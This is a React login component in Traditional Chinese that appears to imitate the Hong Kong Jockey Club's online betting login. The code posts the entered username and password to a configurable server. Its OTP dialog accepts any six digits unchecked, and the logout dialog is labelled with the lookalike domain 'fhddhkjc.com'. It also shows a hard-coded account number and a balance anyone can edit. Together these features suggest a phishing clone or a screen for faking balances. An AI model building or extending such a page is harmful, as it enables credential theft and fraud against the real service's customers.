import React, { useState, useRef, useEffect } from 'react';
import { createPortal } from 'react-dom';
import axios from "axios";
import { IoMdClose } from "react-icons/io";
import { useLanguage } from '../../context/LanguageContext';
import { otpVerifyText } from '../../i18n/otpVerify';
import TermsContent from './TermsContent';
import AccountRecordModal from '../record/AccountRecordModal';
import BalanceEditModal from '../shared/BalanceEditModal';
import { useDisplayBalance } from '../../hooks/useDisplayBalance';
import './UserLogin.css';

const OTP_LENGTH = 6;

const UserLogin = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState("");
    const [success, setSuccess] = useState("");
    const [showTermsModal, setShowTermsModal] = useState(false);
    const [otpDigits, setOtpDigits] = useState(Array(OTP_LENGTH).fill(''));
    const [resendSeconds, setResendSeconds] = useState(96);
    const otpInputRefs = useRef([]);
    const [eye, setEye] = useState(true);
    const { balance, setBalance } = useDisplayBalance();
    const [showBalanceModal, setShowBalanceModal] = useState(false);
    const [readTerm, setReadTerm] = useState(false);
    const [showModal, setShowModal] = useState(false);
    const [showAccountRecordModal, setShowAccountRecordModal] = useState(false);
    const [isLoggingIn, setIsLoggingIn] = useState(false);

    const { language } = useLanguage();
    const t = otpVerifyText[language];
    const app_url = process.env.REACT_APP_APP_URL;
    const handleUserLogin = async (e) => {
        e.preventDefault();
        setIsLoggingIn(true);
        setError("");

        await new Promise((resolve) => setTimeout(resolve, 5000));

        try {
            const response = await axios.post(`${app_url}/api/user-login`, { username, password });
            localStorage.setItem("user-token", response.data.token);
            setSuccess("登入成功！");
            setError("");
            setOtpDigits(Array(OTP_LENGTH).fill(''));
            setResendSeconds(96);
        } catch (error) {
            setError("登入資料不正確，請重新儲入正確的登入名稱及8-20位元包含英文字母及數字的密碼。");
            setSuccess("");
        } finally {
            setIsLoggingIn(false);
        }
    };

    const handleCloseModal = (e) => {
        e.preventDefault();
        setError("");
    }
    useEffect(() => {
        if (!success) return;
        setResendSeconds(96);
        const timer = setInterval(() => {
            setResendSeconds((s) => (s > 0 ? s - 1 : 0));
        }, 1000);
        return () => clearInterval(timer);
    }, [success]);

    const completeOtpVerification = () => {
        localStorage.setItem("user-question", "verified");
        setShowTermsModal(true);
        setSuccess("");
        setOtpDigits(Array(OTP_LENGTH).fill(''));
    };

    const handleOtpChange = (index, value) => {
        const digit = value.replace(/\D/g, '').slice(-1);
        const next = [...otpDigits];
        next[index] = digit;
        setOtpDigits(next);

        if (digit && index < OTP_LENGTH - 1) {
            otpInputRefs.current[index + 1]?.focus();
        }

        if (next.every((d) => d !== '')) {
            completeOtpVerification();
        }
    };

    const handleOtpKeyDown = (index, e) => {
        if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
            otpInputRefs.current[index - 1]?.focus();
        }
    };

    const handleOtpPaste = (e) => {
        e.preventDefault();
        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, OTP_LENGTH);
        if (!pasted) return;

        const next = Array(OTP_LENGTH).fill('');
        pasted.split('').forEach((char, i) => {
            next[i] = char;
        });
        setOtpDigits(next);

        if (pasted.length === OTP_LENGTH) {
            completeOtpVerification();
        } else {
            otpInputRefs.current[pasted.length]?.focus();
        }
    };

    const handleOtpCancel = (e) => {
        e.preventDefault();
        setSuccess("");
        setOtpDigits(Array(OTP_LENGTH).fill(''));
        setUsername("");
        setPassword("");
        localStorage.removeItem("user-token");
        localStorage.removeItem("user-question");
    };

    const formatResendTime = (seconds) => {
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;
        return `${m}:${s.toString().padStart(2, '0')}`;
    };

    const toggleEye = () => {
        setEye((prevEye) => !prevEye);
    };
    const agreeTerms = () => {
        setReadTerm(true);
        setShowTermsModal(false);
        setSuccess("");
    };
    const userLogout = () => {
        localStorage.removeItem("user-token");
        localStorage.removeItem("user-question");
        setShowModal(false);
        setShowAccountRecordModal(false);
        setReadTerm(false);
        setShowTermsModal(false);
        setSuccess("");
        setOtpDigits(Array(OTP_LENGTH).fill(''));
    };
    const openAccountRecord = (e) => {
        e.preventDefault();
        setShowAccountRecordModal(true);
    };

  return (
    <div className='user-login-section'>
            <div className="user-login-container">
                {(readTerm || showTermsModal) ? (
                    <div className='user-login-box'>
                        <div className="user-login-basic-form" style={{display:'flex', justifyContent:'space-between'}}>
                            <div style={{display:'flex', justifyContent:'space-between', alignItems:'flex-start'}}>
                                <img src='/image/user.svg' alt='user' width={28}/>
                                <div className='user-profile-balance'>
                                    <div style={{fontSize:'12px'}}>投注戶口號碼</div>
                                    <div style={{fontSize:'16px', fontWeight:'500'}}>15339692</div>
                                    <div style={{display:'flex', alignItems:'center', lineHeight:'18px'}}>
                                        <div style={{fontSize:'12px'}}>結餘</div>
                                        <div onClick={toggleEye} style={{ cursor: 'pointer', marginLeft:'8px' }}>
                                            <img src={eye ? '/image/eye_on.svg' : '/image/eye_close.svg'} alt={eye ? "eye-on" : "eye-close"} width={20} />
                                        </div>
                                    </div>
                                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center'}}>
                                        <div
                                            className="user-balance-editable"
                                            style={{fontSize:'16px', fontWeight:'500', minWidth:'100px', cursor:'pointer'}}
                                            onClick={() => setShowBalanceModal(true)}
                                            title="點擊編輯結餘"
                                        >
                                            $ {eye ? balance : '*****'}
                                        </div>
                                        <div style={{cursor:'pointer'}}><img src='/image/refresh.svg' alt='refresh'></img></div>
                                    </div>
                                </div>
                            </div>
                            <div style={{display:'flex', alignItems:'flex-end'}}>
                                <div className='user-logout' onClick={() => setShowModal(true)}>登出</div>
                            </div>
                        </div>
                        <div className="extra-links">
                            <div>
                                <a href="#" onClick={openAccountRecord}>戶口紀錄</a> | 
                                <a href="#">轉賬服務</a>
                            </div>
                            <div className='extra-link-icons'>
                                <img src='/image/add_note_white.svg' alt='add_note_white' width={26}></img>
                                <img src='/image/setIcon.svg' alt='set-icon' width={26}></img>
                            </div>
                        </div>
                    </div>
                ) : (
                    <div className='user-login-box'>
                        <div className="user-login-basic-form">
                            {isLoggingIn && (
                                <div className="user-login-loading-overlay" aria-busy="true" aria-label="登入中">
                                    <div className="user-login-loading-box">
                                        <div className="user-login-spinner">
                                            {Array.from({ length: 12 }, (_, i) => (
                                                <span key={i} className="user-login-spinner-bar" />
                                            ))}
                                        </div>
                                    </div>
                                </div>
                            )}
                            <form onSubmit={handleUserLogin}>
                                <div className='user-login-form'>
                                    <div className='user-login-input'>
                                        <div className="input-group">
                                            <input
                                                type="text"
                                                placeholder="登入名稱 / 投注戶口號碼"
                                                value={username}
                                                onChange={(e) => setUsername(e.target.value)}
                                                className="input-field"
                                                disabled={isLoggingIn}
                                                required
                                            />
                                        </div>
                                        <div className="input-group">
                                            <input
                                                type="password"
                                                placeholder="網上密碼"
                                                value={password}
                                                onChange={(e) => setPassword(e.target.value)}
                                                className="input-field"
                                                disabled={isLoggingIn}
                                                required
                                            />
                                        </div>
                                    </div>
                                    <button type="submit" className="user-login-btn" disabled={isLoggingIn}>
                                        登入
                                    </button>
                                </div>
                            </form>
                        </div>
                        <div className="extra-links">
                            <div>
                                <a href="#">申請網上投注服務</a> | 
                                <a href="#">無法登入</a>
                            </div>
                            <div style={{cursor:'pointer'}}>
                                <img src='/image/setIcon.svg' alt='set-icon' width={26}></img>
                            </div>
                        </div>
                    </div>
                )}
                
                <div className='user-login-detail-container'>
                    {error && 
                        <div className='user-login-error-modal'>
                            <div className='user-login-error-modal-close' onClick={handleCloseModal}>
                                <IoMdClose />
                            </div>
                            <p className="error-text">{error}</p>
                        </div>
                    }
                </div>
                
                <div className='user-login-manage'>
                    <div className='manage-text'>
                        <div>總注數:</div>
                        <div>0</div>
                    </div>
                    <div className='manage-text'>
                        <div>總投注金額:</div>
                        <div>$0</div>
                    </div>
                    <div className='manage-button'>
                        <button style={{width:'90px'}}><img src='/image/deleteIcon.svg' alt='delete-icon'></img></button>
                        <button style={{width:'230px'}}>發送注項</button>
                    </div>
                </div>
            </div>
        {/* Terms modal — centered over main content (screenshot 2) */}
        {showTermsModal && createPortal(
            <div className="terms-modal-overlay" role="dialog" aria-modal="true" aria-label="條款及細則">
                <div className="terms-modal">
                    <h2 className="terms-modal-title">條款及細則</h2>
                    <div className="terms-modal-body">
                        <TermsContent />
                    </div>
                    <div className="terms-modal-footer">
                        <button type="button" className="terms-modal-btn" onClick={agreeTerms}>
                            進入主頁
                        </button>
                    </div>
                </div>
            </div>,
            document.body
        )}
        {/* Logout Confirmation Modal */}
        {showModal && (
            <div className="modal-overlay">
                <div className="modal-content">
                    <div className="modal-content-title">fhddhkjc.com says</div>
                    <div>登出後，如有未傳送的注項將被删除。如你正在其他視窗開啟馬會網上服務，該等服務亦會同時被登出，如有需要請關閉該等視窗。</div>
                    <div className="modal-actions">
                        <button onClick={() => setShowModal(false)} className="cancel-btn">取消</button>
                        <button onClick={userLogout} className="confirm-btn">確定</button>
                    </div>
                </div>
            </div>
        )}
        {showAccountRecordModal && (
            <AccountRecordModal onClose={() => setShowAccountRecordModal(false)} />
        )}
        <BalanceEditModal
            isOpen={showBalanceModal}
            initialValue={balance}
            onSave={setBalance}
            onClose={() => setShowBalanceModal(false)}
        />
        {success && createPortal(
            <div className="user-otp-overlay" role="dialog" aria-modal="true" aria-label={t.ariaLabel}>
                <div className="user-otp-verify">
                    <h2 className="user-otp-verify-title">{t.title}</h2>
                    <p className="user-otp-verify-desc">
                        {t.sentTo}{" "}
                        <strong>+852-XXXX6440</strong>
                    </p>
                    <p className="user-otp-verify-hint">{t.hint}</p>
                    <div className="user-otp-input-row">
                        <span className="user-otp-prefix">XDNZ -</span>
                        <div className="user-otp-boxes">
                            {otpDigits.map((digit, index) => (
                                <input
                                    key={index}
                                    ref={(el) => { otpInputRefs.current[index] = el; }}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={1}
                                    className="user-otp-box"
                                    value={digit}
                                    onChange={(e) => handleOtpChange(index, e.target.value)}
                                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                                    onPaste={handleOtpPaste}
                                    autoFocus={index === 0}
                                />
                            ))}
                        </div>
                    </div>
                    <p className="user-otp-resend-label">{t.resendLabel}</p>
                    <p className="user-otp-resend-timer">
                        {resendSeconds > 0
                            ? t.resendWithTime(formatResendTime(resendSeconds))
                            : t.resend}
                    </p>
                    <div className="user-otp-help">
                        <span className="user-otp-help-icon">?</span>
                        <a href="#" className="user-otp-help-link" onClick={(e) => e.preventDefault()}>
                            {t.helpLink}
                        </a>
                    </div>
                    <a href="#" className="user-otp-more-link" onClick={(e) => e.preventDefault()}>
                        {t.moreWays}
                    </a>
                    <button type="button" className="user-otp-cancel" onClick={handleOtpCancel}>
                        {t.cancel}
                    </button>
                </div>
            </div>,
            document.body
        )}
    </div>
  );
};

export default UserLogin;
